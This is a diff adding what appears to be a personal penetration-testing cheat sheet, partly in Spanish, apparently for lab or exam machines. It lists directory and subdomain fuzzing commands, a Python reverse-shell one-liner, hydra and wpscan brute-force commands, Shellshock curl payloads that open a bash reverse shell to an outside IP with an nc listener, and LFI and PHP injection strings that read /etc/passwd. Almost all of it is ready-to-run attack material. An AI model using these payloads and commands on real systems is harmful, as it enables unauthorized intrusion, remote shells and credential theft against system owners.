@@ -1,0 +1,44 @@
+Fuzzing
+dirb http://192.168.196.128/core
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u http://192.168.150.142/FUZZ
+ffuf -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u http://192.168.150.142/FUZZ -e .php,.conf,.xml,.html
+ffuf -u 'http://192.168.94.80/console/file.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 0
+
+wfuzz -c  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hw 530
+
+
+##Reverseshell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.55",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+
+Auth Basic -  brute force
+hydra 192.168.55.90 -l admin -P password.lst http-get
+
+
+Scan user auth 
+gobuster dir -u http://192.168.55.90 -U admin -P Football -w ../rockyou.txt
+
+
+#Shellshock
+curl -vvvv  -H 'User-Agent: () { :; }; /bin/bash -c "uname -i"' http://10.11.1.71/cgi-bin/admin.cgi  --- Respuesta EXITOSA!!!
+curl -vvvv  -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.192/9998 0>&1' http://10.11.1.71/cgi-bin/admin.cgi --- Se crea un revershell
+nc -lnvp 9998 --- recibiendo revershell
+
+#worpress bruteforce
+wpscan --url httpxxxx -U user -P Pass //Brute force
+wpscan --url httpxxxx -e u //identifcar usuarios
+
+
+RCE 
+
+https://www.revshells.com/
+
+
+LFI
+
+
+Lista: https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt
+
+' and die(show_source('/etc/passwd')) or '
+
+
+
